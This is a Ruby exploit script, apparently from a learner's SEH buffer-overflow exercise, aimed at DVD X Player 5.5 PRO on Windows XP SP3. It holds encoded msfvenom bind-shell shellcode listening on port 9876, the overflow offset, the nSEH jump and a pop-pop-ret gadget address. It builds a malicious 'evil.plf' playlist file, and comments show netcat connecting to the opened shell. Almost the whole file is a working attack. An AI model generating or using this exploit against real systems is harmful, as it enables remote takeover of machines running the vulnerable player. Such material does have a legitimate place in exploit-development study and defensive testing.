#!/usr/bin/ruby

#####################################################################################
# INFORMATION
# Confirmed on Windows XP SP3
# Buffer overflow in DVD X Player 5.5 PRO
# http://www.exploit-db.com/wp-content/themes/exploit/applications/cdfda7217304f4deb7d2e8feb5696394-DVDXPlayerSetup.exe
#
# Application will crash once the session is terminated. 
#
# Badchars: "\x00\x0A\x0D\x1A"
#
# root@BradKali:~/# nc -nv 192.168.217.133 9876
# (UNKNOWN) [192.168.217.133] 9876 (?) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# Z:\Development\BOF\FuzzySecurity\P3_SEH>
# 
#####################################################################################

###################################################################################################
# Pretty Colours!
class String
	def error;        "\e[31m[!]\e[0m #{self}" end        # [!] Red
	def fail;         "\e[31m[-]\e[0m #{self}" end        # [-] Red
	def success;      "\e[32m[+]\e[0m #{self}" end        # [+] Green
	def event;        "\e[34m[*]\e[0m #{self}" end        # [*] Blue
	def debug;        "\e[35m[%]\e[0m #{self}" end        # [%] Magenta
	def notification; "[-] #{self}" end                   # [-]
end
###################################################################################################
# msfvenom -p windows/shell_bind_tcp LPORT=9876 -e x86/shikata_ga_nai -b '\x00\x0A\x0D\x1A' -i 1 -f ruby
buf =
"\xba\x27\xec\x1f\x79\xdb\xc4\xd9\x74\x24\xf4\x5e\x29\xc9" +
"\xb1\x53\x31\x56\x12\x03\x56\x12\x83\xc9\x10\xfd\x8c\xe9" +
"\x01\x80\x6f\x11\xd2\xe5\xe6\xf4\xe3\x25\x9c\x7d\x53\x96" +
"\xd6\xd3\x58\x5d\xba\xc7\xeb\x13\x13\xe8\x5c\x99\x45\xc7" +
"\x5d\xb2\xb6\x46\xde\xc9\xea\xa8\xdf\x01\xff\xa9\x18\x7f" +
"\xf2\xfb\xf1\x0b\xa1\xeb\x76\x41\x7a\x80\xc5\x47\xfa\x75" +
"\x9d\x66\x2b\x28\x95\x30\xeb\xcb\x7a\x49\xa2\xd3\x9f\x74" +
"\x7c\x68\x6b\x02\x7f\xb8\xa5\xeb\x2c\x85\x09\x1e\x2c\xc2" +
"\xae\xc1\x5b\x3a\xcd\x7c\x5c\xf9\xaf\x5a\xe9\x19\x17\x28" +
"\x49\xc5\xa9\xfd\x0c\x8e\xa6\x4a\x5a\xc8\xaa\x4d\x8f\x63" +
"\xd6\xc6\x2e\xa3\x5e\x9c\x14\x67\x3a\x46\x34\x3e\xe6\x29" +
"\x49\x20\x49\x95\xef\x2b\x64\xc2\x9d\x76\xe1\x27\xac\x88" +
"\xf1\x2f\xa7\xfb\xc3\xf0\x13\x93\x6f\x78\xba\x64\x8f\x53" +
"\x7a\xfa\x6e\x5c\x7b\xd3\xb4\x08\x2b\x4b\x1c\x31\xa0\x8b" +
"\xa1\xe4\x5d\x83\x04\x57\x40\x6e\xf6\x07\xc4\xc0\x9f\x4d" +
"\xcb\x3f\xbf\x6d\x01\x28\x28\x90\xaa\x70\x3d\x1d\x4c\x16" +
"\x2d\x48\xc6\x8e\x8f\xaf\xdf\x29\xef\x85\x77\xdd\xb8\xcf" +
"\x40\xe2\x38\xda\xe6\x74\xb3\x09\x33\x65\xc4\x07\x13\xf2" +
"\x53\xdd\xf2\xb1\xc2\xe2\xde\x21\x66\x70\x85\xb1\xe1\x69" +
"\x12\xe6\xa6\x5c\x6b\x62\x5b\xc6\xc5\x90\xa6\x9e\x2e\x10" +
"\x7d\x63\xb0\x99\xf0\xdf\x96\x89\xcc\xe0\x92\xfd\x80\xb6" +
"\x4c\xab\x66\x61\x3f\x05\x31\xde\xe9\xc1\xc4\x2c\x2a\x97" +
"\xc8\x78\xdc\x77\x78\xd5\x99\x88\xb5\xb1\x2d\xf1\xab\x21" +
"\xd1\x28\x68\x51\x98\x70\xd9\xfa\x45\xe1\x5b\x67\x76\xdc" +
"\x98\x9e\xf5\xd4\x60\x65\xe5\x9d\x65\x21\xa1\x4e\x14\x3a" +
"\x44\x70\x8b\x3b\x4d"

buffSize = 2000
#SEH record (nseh field) at 0x0012f5b8 overwritten with normal pattern : 0x33754132 (offset 608), followed by 1384 bytes of cyclic data after the handler
junk = "\x41" * 608
# opcode for JMP 0012F5C2 (location of shellcode)
# 0xEB 0x08 0x90 0x90
# EDIT: Not sure how but I ended up getting the wrong address for the jump, it should have been 0x0012F5C0 (ie. 0xEB 0x06).
# EDIT: Added in a NOP sled to see if this makes it work anyway without being 100% bang on the stack address, will update this to be specific if need be.
# EDIT2: Reference the picture (stackAddrComparison.PNG).  Address I chose was from the CPU window, and the address which comes directly after SEH is 0x0012F5C2, but if you have a look on the stack, the beginning of our controllable input (after SEH) is actually 0x0012F5C0.  Always check the stack values!!
nseh = "\xEB\x08\x90\x90"
#0x640345e7 : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [MediaPlayerCtrl.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.2 (C:\Program Files\Aviosoft\DVD X Player 5.5 Professional\MediaPlayerCtrl.dll)
seh = "\xE7\x45\x03\x64"
evil = "\x90" * 100 + buf
filler = "\x44" * (buffSize - (junk.length + nseh.length + seh.length + evil.length))
# Since our Windows stack grows downward we will see that the order of these records is reversed [nSEH]...[SEH].
exploit = junk + nseh + seh + evil + filler

###################################################################################################

output = "evil.plf"

begin
	if File.exists?(output)
		puts "File [#{output}] exists!! Overwriting!".event
	end

	outputFile = File.open(output, "w")
	outputFile.puts exploit
	outputFile.close

    puts "Successfully wrote to [#{output}]\n".success
    puts "Check for a bind shell on the host on [ip]:9876".success

rescue SystemExit, Interrupt
	puts "[Ctrl + C] caught! Exiting".error
	abort()
end
